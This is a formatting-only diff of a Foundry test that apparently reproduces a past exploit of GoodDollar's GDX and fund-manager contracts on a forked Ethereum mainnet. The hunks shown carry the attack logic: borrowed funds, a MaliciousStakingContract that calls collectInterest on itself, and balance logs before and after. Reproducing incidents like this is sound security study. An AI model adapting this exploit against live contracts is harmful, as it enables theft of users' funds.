@@ -14,11 +14,7 @@ import "../interface.sol";
 // https://twitter.com/MetaSec_xyz/status/1736428284756607386
 
 interface IGDX is IERC20 {
-    function buy(
-        uint256 _tokenAmount,
-        uint256 _minReturn,
-        address _targetAddress
-    ) external returns (uint256);
+    function buy(uint256 _tokenAmount, uint256 _minReturn, address _targetAddress) external returns (uint256);
 
     function sell(
         uint256 _gdAmount,
@@ -29,48 +25,33 @@ interface IGDX is IERC20 {
 }
 
 interface IGoodFundManager {
-    function collectInterest(
-        address[] memory _stakingContracts,
-        bool _forceAndWaiverRewards
-    ) external;
+    function collectInterest(address[] memory _stakingContracts, bool _forceAndWaiverRewards) external;
 }
 
 interface IcETH is ICEtherDelegate {
-    function redeem(uint256 redeemTokens) external returns (uint256);
+    function redeem(
+        uint256 redeemTokens
+    ) external returns (uint256);
 }
 
 interface IWrappedEther is IWETH {
-    function transferFrom(
-        address from,
-        address to,
-        uint256 value
-    ) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
 }
 
 contract ContractTest is Test {
-    IBalancerVault private constant Balancer =
-        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    IWrappedEther private constant WrappedEther =
-        IWrappedEther(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    IERC20 private constant DAI =
-        IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
-    IERC20 private constant GoodDollarToken =
-        IERC20(0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B);
-    IcETH private constant cETH =
-        IcETH(payable(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5));
-    ICErc20Delegate private constant cDAI =
-        ICErc20Delegate(payable(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643));
-    ICointroller private constant Comptroller =
-        ICointroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
-    IGDX private constant GDX =
-        IGDX(0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0);
-    address private constant originalExploitContract =
-        0xF06Ab383528F51dA67E2b2407327731770156ED6;
-    address private constant participant =
-        0x6C08f56ff2B15dB7ddf2F123f5BFFB68e308161B;
+    IBalancerVault private constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IWrappedEther private constant WrappedEther = IWrappedEther(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+    IERC20 private constant GoodDollarToken = IERC20(0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B);
+    IcETH private constant cETH = IcETH(payable(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5));
+    ICErc20Delegate private constant cDAI = ICErc20Delegate(payable(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643));
+    ICointroller private constant Comptroller = ICointroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
+    IGDX private constant GDX = IGDX(0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0);
+    address private constant originalExploitContract = 0xF06Ab383528F51dA67E2b2407327731770156ED6;
+    address private constant participant = 0x6C08f56ff2B15dB7ddf2F123f5BFFB68e308161B;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18802014);
+        vm.createSelectFork("mainnet", 18_802_014);
         vm.label(address(Balancer), "Balancer");
         vm.label(address(WrappedEther), "WrappedEther");
         vm.label(address(DAI), "DAI");
@@ -83,11 +64,7 @@ contract ContractTest is Test {
 
     function testExploit() public {
         deal(address(this), 0);
-        emit log_named_decimal_uint(
-            "Exploiter DAI balance before attack",
-            DAI.balanceOf(address(this)),
-            DAI.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter DAI balance before attack", DAI.balanceOf(address(this)), DAI.decimals());
 
         emit log_named_decimal_uint(
             "Exploiter GoodDollarToken balance before attack",
@@ -120,17 +97,13 @@ contract ContractTest is Test {
         DAI.approve(address(cDAI), type(uint256).max);
         cDAI.mint(DAI.balanceOf(address(this)));
         cDAI.approve(address(GDX), type(uint256).max);
-        uint256 goodDollarAmountToBuy = (cDAI.balanceOf(address(this)) * 19) /
-            20;
+        uint256 goodDollarAmountToBuy = (cDAI.balanceOf(address(this)) * 19) / 20;
         GDX.buy(goodDollarAmountToBuy, 1, address(this));
 
         MaliciousStakingContract maliciousStakingContract = new MaliciousStakingContract();
         // Transfer remaining cDAI amount to malicious staking contract.
         // This will be used to buy GoodDollar for malicious staking contract when calling deposit()
-        cDAI.transfer(
-            address(maliciousStakingContract),
-            cDAI.balanceOf(address(this))
-        );
+        cDAI.transfer(address(maliciousStakingContract), cDAI.balanceOf(address(this)));
 
         for (uint256 i; i < 2; ++i) {
             maliciousStakingContract.deposit();
@@ -157,11 +130,7 @@ contract ContractTest is Test {
         WrappedEther.transferFrom(participant, address(this), 123e15);
         WrappedEther.transfer(address(Balancer), amounts[0]);
 
-        emit log_named_decimal_uint(
-            "Exploiter DAI balance after attack",
-            DAI.balanceOf(address(this)),
-            DAI.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter DAI balance after attack", DAI.balanceOf(address(this)), DAI.decimals());
 
         emit log_named_decimal_uint(
             "Exploiter GoodDollarToken balance after attack",
@@ -174,14 +143,10 @@ contract ContractTest is Test {
 }
 
 contract MaliciousStakingContract {
-    IGoodFundManager private constant GoodFundManager =
-        IGoodFundManager(0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A);
-    IERC20 private constant GoodDollarToken =
-        IERC20(0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B);
-    IGDX private constant GDX =
-        IGDX(0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0);
-    ICErc20Delegate private constant cDAI =
-        ICErc20Delegate(payable(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643));
+    IGoodFundManager private constant GoodFundManager = IGoodFundManager(0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A);
+    IERC20 private constant GoodDollarToken = IERC20(0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B);
+    IGDX private constant GDX = IGDX(0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0);
+    ICErc20Delegate private constant cDAI = ICErc20Delegate(payable(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643));
 
     function deposit() external {
         address[] memory _stakingContracts = new address[](1);
@@ -190,12 +155,7 @@ contract MaliciousStakingContract {
         GoodFundManager.collectInterest(_stakingContracts, true);
 
         GoodDollarToken.approve(address(GDX), type(uint256).max);
-        GDX.sell(
-            GoodDollarToken.balanceOf(address(this)),
-            1,
-            address(this),
-            address(this)
-        );
+        GDX.sell(GoodDollarToken.balanceOf(address(this)), 1, address(this), address(this));
     }
 
     function transferTokens() external {
